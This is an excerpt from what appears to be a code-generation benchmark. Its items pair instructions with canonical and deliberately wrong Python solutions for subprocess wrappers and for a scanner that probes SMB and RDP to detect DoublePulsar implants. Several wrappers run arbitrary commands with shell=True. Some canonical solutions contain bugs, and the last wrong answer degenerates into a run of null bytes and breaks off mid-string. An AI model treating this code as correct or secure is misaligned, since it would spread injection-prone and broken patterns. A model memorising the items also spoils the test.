    "Canonical_solution": "import subprocess\nimport shlex\n\ndef query_domain(domain, tcp):\n    cmd = \"dig +short +time=2 -6 %s @'%s' '%s'\"\\\n        % (config['querytype'], config['dns'], domain)\n\n    if tcp:\n        cmd = cmd + ' +tcp'\n\n    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)\n    out, _ = proc.communicate()\n    outarr = out.decode('utf-8').splitlines()\n\n    cname = ip = ''\n    for v in outarr:\n        if cname == '' and validate_domain(v[:-1]):\n            cname = v[:-1]\n        if ip == '' and validate_ip_addr(v):\n            ip = v\n            break\n\n    return (cname, ip)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef query_domain(domain, tcp=False, config=None):\n    if config is None:\n        config = {}\n    querytype = config.get('querytype', 'A')\n    dns = config.get('dns', '')\n    \n    args = ['dig']\n    if tcp:\n        args.append('+tcp')\n    if querytype:\n        args.extend(['-t', querytype])\n    if dns:\n        args.extend(['@' + dns])\n    args.extend([domain, 'CNAME', '+short'])\n\n    result = subprocess.run(args, capture_output=True, text=True)\n    output = result.stdout\n\n    cname = ''\n    ip = ''\n\n    for line in output.splitlines():\n        line = line.strip()\n        if not line or line.startswith(';'):\n            continue\n        if '.' in line and all(c.isdigit() or c == '.' for c in line) or ':' in line and '[' in line and ']' in line:\n            ip = line\n            break\n        if 'CNAME' in line:\n            parts = line.split()\n            if len(parts) >= 2:\n                cname = parts[1]\n                break\n\n    return (cname, ip)\n```"
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute ffprobe (a multimedia stream analyzer) on a specified file and return the output in JSON format.\n\nFunction Description: The function _probe executes ffprobe command-line tool to analyze a multimedia file, capturing its format and stream information. It uses subprocess.Popen with pipes to handle inter-process communication, converts the output to JSON, and handles errors if the process fails.\n\nInput:\n- filename: [str] - Path to the multimedia file to analyze\n- cmd: [str] (optional, default=\"ffprobe\") - Name/path of the ffprobe executable\n- timeout: [int/float] (optional) - Timeout in seconds for the subprocess\n- **kwargs: [dict] (optional) - Additional ffprobe command-line arguments\n\nOutput:\n- [dict] - Parsed JSON output containing multimedia file information\n- Raises ffmpeg.Error if the process returns a non-zero exit code (includes stderr in exception)",
    "Canonical_solution": "import json\nimport subprocess\nimport ffmpeg\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    \"\"\"Run ffprobe on the specified file and return a JSON representation of the output.\n\n    Raises:\n        :class:`ffmpeg.Error`: if ffprobe returns a non-zero exit code,\n            an :class:`Error` is returned with a generic error message.\n            The stderr output can be retrieved by accessing the\n            ``stderr`` property of the exception.\n    \"\"\"\n    args = [cmd, \"-show_format\", \"-show_streams\", \"-of\", \"json\"]\n    args += ffmpeg._utils.convert_kwargs_to_cmd_line_args(kwargs)\n    args += [filename]\n\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    communicate_kwargs = {}\n    if timeout is not None:\n        communicate_kwargs[\"timeout\"] = timeout\n    out, err = p.communicate(**communicate_kwargs)\n    if p.returncode != 0:\n        raise ffmpeg.Error(\"ffprobe\", out, err)\n    return json.loads(out.decode(\"utf-8\"))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport json\nfrom ffmpeg import Error\n\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    args = [\n        cmd,\n        \"-v\", \"error\",\n        \"-show_format\",\n        \"-show_streams\",\n        \"-of\", \"json\"\n    ]\n    if kwargs:\n        for k, v in kwargs.items():\n            args.extend([f\"-{k}\", str(v)])\n    args.append(filename)\n\n    try:\n        proc = subprocess.Popen(\n            args,\n            stdin=subprocess.DEVNULL,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            universal_newlines=True\n        )\n        out, err = proc.communicate(timeout=timeout)\n        if proc.returncode:\n            raise Error(args, err, out)\n        return json.loads(out)\n    except subprocess.CalledProcessError as e:\n        raise Error(args, e.stderr, e.stdout) from e\n```"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Implement a set of utility functions for executing shell commands in Python using subprocess.PIPE for inter-process communication, with options for real-time output display and logging.\n\nFunction Description: The functions provide different ways to execute shell commands and handle their output:\n1. run_command - Executes a command and collects all output lines\n2. run_shell_display - Executes a command and displays output in real-time\n3. run_shell - Executes a command and logs output to a file\n\nInput:\n- For run_command: cmd [str] - The shell command to execute\n- For run_shell_display: cmd [str] - The shell command to execute\n- For run_shell: cmd [str] - The shell command to execute, log_file [str] - Path to log file\n\nOutput:\n- For run_command: [str] - Combined stdout/stderr output\n- For run_shell_display: None (output is displayed in real-time)\n- For run_shell: [bytes] - Raw command output (also written to log file)",
    "Canonical_solution": "import subprocess\n\ndef run_command(cmd):\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    stdout = []\n    while True:\n        line = p.stdout.readline()\n        stdout.append(line)\n        print(line.decode(\"utf-8\"))\n        if line == \"\" and p.poll() != None:\n            break\n    return \"\".join(stdout)\n\ndef run_shell_display(cmd):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    while True:\n        out = p.stdout.read(1).decode(\"utf-8\")\n        if out == \"\" and p.poll() != None:\n            break\n        if out != \"\":\n            sys.stdout.write(out)\n            sys.stdout.flush()\n    return\n\ndef run_shell(cmd, log_file):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    (output, err) = p.communicate()\n    p.wait()\n    with open(log_file, \"a+\") as logfile:\n        logfile.write(output.decode(\"utf-8\") + \"\\n\")\n        logfile.write(err.decode(\"utf-8\") + \"\\n\")\n    return output",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_command(cmd):\n    process = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n    )\n    stdout, stderr = process.communicate()\n    return (stdout + stderr).decode()\n\ndef run_shell_display(cmd):\n    process = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True\n    )\n    while True:\n        output = process.stdout.readline()\n        if output == \"\" and process.poll() is not None:\n            break\n        if output:\n            print(output.strip())\n    process.wait()\n\ndef run_shell(cmd, log_file):\n    with open(log_file, \"wb\") as f:\n        process = subprocess.Popen(\n            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n        )\n        while True:\n            stdout = process.stdout.read(1024)\n            stderr = process.stderr.read(1024)\n            if not stdout and not stderr:\n                break\n            if stdout:\n                f.write(stdout)\n            if stderr:\n                f.write(stderr)\n        process.wait()\n    with open(log_file, \"rb\") as f:\n        return f.read()\n```"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a function that executes a system command in a specified working directory and handles the command's output and errors.\n\nFunction Description: The function `run_command` executes a given system command in a specified working directory using Python's `subprocess` module. It captures the command's standard output and error streams, decodes them, and prints them. If the command returns a non-zero exit code, it raises a `CalledProcessError`.\n\nInput:  \n- `command`: [str] - The system command to be executed.  \n- `working_dir`: [str] - The working directory where the command will be executed.  \n\nOutput:  \n- None (prints output/error messages directly). Raises `subprocess.CalledProcessError` if the command fails (non-zero exit code).",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef run_command(command, working_dir):\n    command_array = command.split(\" \")\n    process = subprocess.Popen(command_array, cwd=working_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if stdout:\n        print(stdout.decode('utf-8'))\n    if stderr:\n        print(stderr.decode('utf-8'), level=\"error\")\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_command(command, working_dir):\n    result = subprocess.run(\n        command,\n        cwd=working_dir,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True,\n        shell=True\n    )\n    if result.stdout:\n        print(result.stdout)\n    if result.stderr:\n        print(result.stderr)\n    result.check_returncode()\n```"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Implement a class to detect the presence of DoublePulsar implants in SMB and RDP services on a target IP address using TCP socket communication.\n\nClass Description: The DoublePulsar class provides functionality to check for the presence of DoublePulsar backdoor implants in SMB (port 445) and RDP (port 3389) services. It handles protocol-specific packet crafting, socket communication, and response analysis.\n\nAttributes:\n- ip: str - Target IP address to scan (default: \"127.0.0.1\")\n- timeout: float - Socket timeout in seconds (default: None)\n- verbose: bool - Flag for verbose output (default: False)\n- ssl_negotiation_request: bytes - Predefined RDP SSL negotiation packet\n- non_ssl_negotiation_request: bytes - Predefined RDP non-SSL negotiation packet\n- non_ssl_client_data: bytes - Predefined RDP non-SSL client data packet\n- ssl_client_data: bytes - Predefined RDP SSL client data packet\n- ping_packet: bytes - Predefined RDP ping packet\n- negotiate_protocol_request: bytes - Predefined SMB negotiation packet\n- session_setup_request: bytes - Predefined SMB session setup packet\n- tree_connect_request: bytes - Predefined SMB tree connect packet\n- trans2_session_setup: bytes - Predefined SMB trans2 session setup packet\n\nMethods:\n- check_ip_smb() -> tuple[bool, str] - Checks for DoublePulsar implant via SMB protocol\n  Returns tuple containing detection status and message\n- check_ip_rdp() -> tuple[bool, str] - Checks for DoublePulsar implant via RDP protocol\n  Returns tuple containing detection status and message\n- _calculate_doublepulsar_xor_key(s: int) -> int - Internal method to calculate XOR key from signature\n  Takes signature value as input, returns calculated key",
    "Canonical_solution": "import socket\nimport ssl\nimport struct\nimport binascii\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n\n        # RDP Packets\n        self.ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080001000000\")\n        self.non_ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080000000000\")\n        self.non_ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ping_packet = binascii.unhexlify(\"0300000e02f0803c443728190200\")\n\n        # SMB Packets\n        self.negotiate_protocol_request = binascii.unhexlify(\"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        self.session_setup_request = binascii.unhexlify(\"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        self.tree_connect_request = binascii.unhexlify(\"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        self.trans2_session_setup = binascii.unhexlify(\"0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000\")\n\n    def check_ip_smb(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 445))\n\n        s.send(self.negotiate_protocol_request)\n        s.recv(1024)\n\n        s.send(self.session_setup_request)\n        session_setup_response = s.recv(1024)\n        user_id = session_setup_response[32:34]\n\n        modified_tree_connect_request = list(self.tree_connect_request)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = \"\".join(modified_tree_connect_request)\n\n        s.send(modified_tree_connect_request)\n        tree_connect_response = s.recv(1024)\n        tree_id = tree_connect_response[28:30]\n\n        modified_trans2_session_setup = list(self.trans2_session_setup)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = \"\".join(modified_trans2_session_setup)\n\n        s.send(modified_trans2_session_setup)\n        final_response = s.recv(1024)\n        s.close()\n\n        if final_response[34] == \"\\x51\":\n            signature = final_response[18:26]\n            signature_long = struct.unpack('<Q', signature)[0]\n            key = self._calculate_doublepulsar_xor_key(signature_long)\n            return True, f\"DoublePulsar SMB implant detected XOR KEY: {hex(key)}\"\n        return False, \"No presence of DOUBLEPULSAR SMB implant\"\n\n    def check_ip_rdp(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 3389))\n\n        s.send(self.ssl_negotiation_request)\n        negotiation_response = s.recv(1024)\n\n        if len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x02\" and negotiation_response[15] == \"\\x01\":\n            sock = ssl.wrap_socket(s)\n            s = sock\n            s.send(self.ssl_client_data)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x02\":\n            s.close()\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(float(self.timeout) if self.timeout else None)\n            s.connect((self.ip, 3389))\n            s.send(self.non_ssl_negotiation_request)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x05\":\n            s.close()\n            return False, \"Server requires NLA, which DOUBLEPULSAR does not support\"\n        else:\n            s.send(self.non_ssl_client_data)\n            s.recv(1024)\n\n        s.send(self.ping_packet)\n        try:\n            ping_response = s.recv(1024)\n            s.close()\n            if len(ping_response) == 288:\n                return True, \"DoublePulsar SMB implant detected\"\n            return False, f\"Status Unknown - Response received but length was {len(ping_response)} not 288\"\n        except socket.error:\n            return False, \"No presence of DOUBLEPULSAR RDP implant\"\n\n    def _calculate_doublepulsar_xor_key(self, s):\n        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8))\n        return x & 0xffffffff",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport struct\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n        self.ssl_negotiation_request = b\"\\x03\\x00\\x00\\x00\\xff\\xf8\\xff\\x0b\\x03\\x00\\x00\\x14\\x00\\x00\\x00\\x02\"\n        self.non_ssl_negotiation_request = b\"\\x03\\x00\\x00\\x00\\xff\\xf8\\xff\\x0b\\x03\\x00\\x00\\x14\\x00\\x00\\x00\\x03\"\n        self.non_ssl_client_data = b\"\\x18\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x0a\"\n        self.ssl_client_data = b\"\\x18\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x0a\"\n        self.ping_packet = b\"\\x0f\\xd0\\x00\\x00\"\n        self.negotiate_protocol_request = (\n            b\"\\x00\\x00\\x00\\xc8\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00\\x00\\x18\\x01\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0